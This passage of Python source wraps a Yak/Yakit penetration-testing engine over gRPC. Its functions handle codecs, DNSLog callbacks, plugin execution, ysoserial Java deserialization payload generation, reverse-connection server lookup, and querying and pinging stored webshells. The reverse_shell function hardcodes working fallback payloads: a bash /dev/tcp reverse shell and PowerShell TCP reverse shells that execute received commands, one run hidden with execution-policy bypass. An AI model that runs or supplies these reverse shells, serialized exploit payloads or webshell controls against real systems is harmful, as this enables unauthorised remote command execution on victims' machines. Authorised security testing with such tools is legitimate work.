            pv.Value = str(v)
            work.Params.append(pv)
        req.WorkFlow.append(work)
        resp = stub.NewCodec(req, timeout=30)
        return {"ok": True, "type": codec_type, "input": text[:500],
                "result": resp.Result[:5000] if resp.Result else ""}
    except Exception as e:
        return {"ok": False, "reason": repr(e)}


def codec_methods(engine: YakEngine) -> dict:
    """获取可用编解码方法列表"""
    stub = engine.connect()
    try:
        resp = stub.GetAllCodecMethods(ypb.Empty())
        methods = []
        for m in resp.Methods or []:
            methods.append({
                "tag": m.Tag,
                "name": m.CodecName,
                "method": m.CodecMethod,
                "desc": m.Desc,
            })
        return {"ok": True, "total": len(methods), "methods": methods[:300]}
    except Exception as e:
        return {"ok": False, "reason": repr(e)}


def dnslog_domain(engine: YakEngine) -> dict:
    """获取 DNSLog 反连域名"""
    stub = engine.connect()
    try:
        resp = stub.RequireDNSLogDomain(ypb.YakDNSLogBridgeAddr())
        return {"ok": True, "domain": resp.Domain}
    except Exception as e:
        return {"ok": False, "reason": repr(e)}


def dnslog_query(engine: YakEngine, token: str) -> dict:
    """查询 DNSLog 记录"""
    stub = engine.connect()
    try:
        req = ypb.QueryDNSLogByTokenRequest()
        req.Token = token
        resp = stub.QueryDNSLogByToken(req)
        logs = []
        for l in resp.Events or []:
            logs.append({
                "dns_type": l.DNSType,
                "token": l.Token,
                "domain": l.Domain,
                "remote_addr": l.RemoteAddr,
                "remote_ip": l.RemoteIP,
                "remote_port": l.RemotePort,
                "timestamp": l.Timestamp,
            })
        return {"ok": True, "token": token, "logs": logs}
    except Exception as e:
        return {"ok": False, "reason": repr(e)}


def extract_url(engine: YakEngine, packet: str) -> dict:
    """从 HTTP 包提取 URL"""
    stub = engine.connect()
    try:
        req = ypb.FuzzerRequest()
        req.Request = packet
        resp = stub.ExtractUrl(req, timeout=30)
        return {"ok": True, "url": resp.Url}
    except Exception as e:
        return {"ok": False, "reason": repr(e)}


# ---------------------------------------------------------------------------
# 插件/脚本: 查询 / 执行 / 对包执行
# ---------------------------------------------------------------------------
def query_plugins(engine: YakEngine, keyword: str = "", limit: int = 50,
                  tags: str = "") -> dict:
    """查询本地插件（YakScript）"""
    stub = engine.connect()
    try:
        req = ypb.QueryYakScriptRequest()
        req.Pagination.Limit = limit
        req.Pagination.Page = 1
        if keyword:
            req.Keyword = keyword
        if tags:
            req.Tag.extend([t.strip() for t in tags.split(",") if t.strip()])
        resp = stub.QueryYakScript(req)
        plugins = []
        for p in resp.Data or []:
            plugins.append({
                "id": p.Id,
                "name": p.ScriptName,
                "type": p.Type,
                "tags": [t for t in (p.Tags or "").split(",") if t],
                "description": (p.Help or "")[:200],
                "level": p.Level,
            })
        return {"ok": True, "total": resp.Total, "plugins": plugins}
    except Exception as e:
        return {"ok": False, "reason": repr(e)}


def exec_plugin(engine: YakEngine, script_name: str, params: str = "",
                work_dir: str = "") -> dict:
    """
    执行 Yakit 插件（ExecYakScript）。
    参数: script_name(插件名或ID), params(参数 JSON,如 {"target":"1.2.3.4"}), work_dir
    注意: 引擎要求 ScriptId/YakScriptId 字段（Script 传名字会报 cannot fetch yak script），
          这里先按名字查 id 再执行。
    """
    stub = engine.connect()
    try:
        # 1) 按名字查插件 id（QueryYakScript）
        script_id = 0
        if script_name.isdigit():
            script_id = int(script_name)
        else:
            q = ypb.QueryYakScriptRequest()
            q.Pagination.Limit = 50
            q.Pagination.Page = 1
            q.Keyword = script_name
            try:
                qresp = stub.QueryYakScript(q)
                for p in qresp.Data or []:
                    if p.ScriptName == script_name:
                        script_id = p.Id
                        break
                if not script_id and qresp.Data:
                    script_id = qresp.Data[0].Id
            except Exception:
                pass
        if not script_id:
            return {"ok": False, "reason": f"未找到插件: {script_name}"}

        # 2) 执行
        req = ypb.ExecRequest()
        req.YakScriptId = script_id
        if params:
            try:
                p = json.loads(params)
                for k, v in p.items():
                    item = ypb.ExecParamItem()
                    item.Key = k
                    item.Value = str(v)
                    req.Params.append(item)
            except Exception:
                item = ypb.ExecParamItem()
                item.Key = "target"
                item.Value = params
                req.Params.append(item)
        if work_dir:
            req.WorkDir = work_dir
        results = []
        for resp in stub.ExecYakScript(req, timeout=300):
            msg = resp.Message or b""
            if msg:
                results.append(msg.decode("utf-8", errors="replace")[:2000])
            if resp.Raw:
                results.append(resp.Raw.decode("utf-8", errors="replace")[:300])
        return {"ok": True, "script": script_name, "script_id": script_id, "results": results[:50]}
    except Exception as e:
        return {"ok": False, "reason": repr(e)}


def exec_packet_plugin(engine: YakEngine, script_name: str, packet: str,
                       is_https: bool = False) -> dict:
    """对 HTTP 包执行插件（ExecutePacketYakScript）—— 插件扫描/检测单个请求"""
    stub = engine.connect()
    try:
        req = ypb.ExecutePacketYakScriptParams()
        req.ScriptName = script_name
        req.IsHttps = is_https
        req.Request = packet.encode("utf-8")
        results = []
        for resp in stub.ExecutePacketYakScript(req, timeout=300):
            msg = resp.Message or b""
            if msg:
                results.append(msg.decode("utf-8", errors="replace")[:400])
        return {"ok": True, "script": script_name, "results": results[:50]}
    except Exception as e:
        return {"ok": False, "reason": repr(e)}


def plugin_tags(engine: YakEngine) -> dict:
    """获取插件标签列表"""
    stub = engine.connect()
    try:
        resp = stub.GetYakScriptTags(ypb.Empty())
        return {"ok": True, "tags": [{"value": t.Value, "total": t.Total} for t in (resp.Tag or [])]}
    except Exception as e:
        return {"ok": False, "reason": repr(e)}


def reverse_shell(engine: YakEngine, ip: str, port: int,
                  system: str = "linux", shell_type: str = "bash",
                  cmd_type: str = "bash-i", encode: str = "") -> dict:
    """
    生成反弹 shell 命令（GenerateReverseShellCommand）。
    system: linux/windows; shell_type: bash/sh/cmd/powershell 等; encode: 可选编码
    """
    stub = engine.connect()
    reason = "engine returned empty result"
    try:
        req = ypb.GenerateReverseShellCommandRequest()
        req.IP = ip
        req.port = port
        req.System = system
        req.ShellType = shell_type
        req.CmdType = cmd_type
        if encode:
            req.Encode = encode
        resp = stub.GenerateReverseShellCommand(req)
        if resp.Result:
            return {"ok": True, "result": resp.Result or "", "source": "engine"}
    except Exception as e:
        reason = repr(e)
    # 引擎不可用时（ProgramList 为空）用内置模板兜底
    templates = {
        "bash": f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
        "sh": f"sh -i >& /dev/tcp/{ip}/{port} 0>&1",
        "powershell": f"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()",
        "cmd": f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{{0}};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){{;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()",
    }
    tpl = templates.get(shell_type) or templates.get("bash")
    return {
        "ok": True,
        "result": tpl,
        "source": "template",
        "note": "引擎模板不可用，已返回内置模板（source=engine 时为引擎生成）",
        "engine_error": reason,
    }


def reverse_shell_programs(engine: YakEngine) -> dict:
    """获取可用的反弹 shell 程序/Shell 列表（GetReverseShellProgramList）"""
    stub = engine.connect()
    try:
        req = ypb.GetReverseShellProgramListRequest()
        resp = stub.GetReverseShellProgramList(req)
        return {
            "ok": True,
            "programs": list(resp.ProgramList or [])[:100],
            "shells": list(resp.ShellList or [])[:100],
        }
    except Exception as e:
        return {"ok": False, "reason": repr(e)}


def auto_decode(engine: YakEngine, data: str) -> dict:
    """自动解码（AutoDecode）—— 不需要指定编码方式"""
    stub = engine.connect()
    try:
        req = ypb.AutoDecodeRequest()
        req.Data = data
        resp = stub.AutoDecode(req)
        results = []
        for m in (resp.Results or []):
            results.append({
                "type": m.Type or "",
                "type_verbose": m.TypeVerbose or "",
                "origin": m.Origin.decode("utf-8", errors="replace") if m.Origin else "",
                "result": m.Result.decode("utf-8", errors="replace") if m.Result else "",
                "modified": bool(m.Modify),
            })
        return {"ok": True, "data": data, "results": results}
    except Exception as e:
        return {"ok": False, "reason": repr(e)}


def yso_generate(engine: YakEngine, gadget: str = "CommonsCollections1",
                 class_name: str = "dnslog", options: str = "{}") -> dict:
    """
    生成 Yso 序列化 payload（GenerateYsoBytes）。
    class_name 为命令类型: dnslog / win_cmd / linux_cmd / jndi / bcel / raw_cmd / httplog / loadjar。
    options 为 JSON，如 {"cmd":"whoami"} 或 {"cmd":{"value":"whoami"}}。
    """
    stub = engine.connect()
    try:
        req = ypb.YsoOptionsRequerstWithVerbose()
        req.Gadget = gadget
        if class_name:
            req.Class = class_name
        if options:
            try:
                opts = json.loads(options)
                for k, v in opts.items():
                    item = ypb.YsoClassGeneraterOptionsWithVerbose()
                    item.Key = k
                    if isinstance(v, dict):
                        item.Type = v.get("type", "string")
                        item.Value = str(v.get("value", ""))
                    else:
                        item.Value = str(v)
                    req.Options.append(item)
            except Exception:
                pass
        resp = stub.GenerateYsoBytes(req)
        data = (resp.Bytes or b"")
        return {
            "ok": True,
            "gadget": gadget,
            "class": class_name,
            "payload_b64": base64.b64encode(data).decode() if data else "",
            "size": len(data),
        }
    except Exception as e:
        return {"ok": False, "reason": repr(e)}


def yso_gadgets(engine: YakEngine) -> dict:
    """获取可用的 YSO gadget 列表（GetAllYsoGadgetOptions）"""
    stub = engine.connect()
    try:
        resp = stub.GetAllYsoGadgetOptions(ypb.Empty())
        return {"ok": True, "gadgets": [o.Name for o in (resp.Options or []) if o.Name]}
    except Exception as e:
        return {"ok": False, "reason": repr(e)}


def reverse_server(engine: YakEngine) -> dict:
    """获取全局反连服务器信息（GetGlobalReverseServer）—— 反弹连接/探测用"""
    stub = engine.connect()
    try:
        resp = stub.GetGlobalReverseServer(ypb.Empty())
        return {
            "ok": True,
            "public_ip": resp.PublicReverseIP or "",
            "public_port": resp.PublicReversePort,
            "local_addr": resp.LocalReverseAddr or "",
            "local_port": resp.LocalReversePort,
        }
    except Exception as e:
        return {"ok": False, "reason": repr(e)}


def query_webshells(engine: YakEngine, tag: str = "", limit: int = 50) -> dict:
    """查询已保存的 WebShell（QueryWebShells），可按 tag 过滤"""
    stub = engine.connect()
    try:
        req = ypb.QueryWebShellsRequest()
        req.Pagination.Limit = limit
        req.Pagination.Page = 1
        if tag:
            req.Tag = tag
        resp = stub.QueryWebShells(req)
        shells = []
        for w in (resp.Data or []):
            shells.append({
                "id": w.Id,
                "url": w.Url or "",
                "pass": w.Pass or "",
                "shell_type": w.ShellType or "",
                "status": bool(w.Status),
                "tag": w.Tag or "",
                "remark": w.Remark or "",
            })
        return {"ok": True, "total": resp.Total, "webshells": shells}
    except Exception as e:
        return {"ok": False, "reason": repr(e)}


def ping_webshell(engine: YakEngine, webshell_id: int) -> dict:
    """Ping WebShell（按 id 验证连通性，返回系统信息）"""
    stub = engine.connect()
    try:
        req = ypb.WebShellRequest()
        req.Id = webshell_id
        resp = stub.Ping(req)
        return {
            "ok": True,
            "id": webshell_id,
            "state": bool(resp.State),
            "data": (resp.Data or b"").decode("utf-8", errors="replace")[:2000],
        }
    except Exception as e:
        return {"ok": False, "reason": repr(e)}
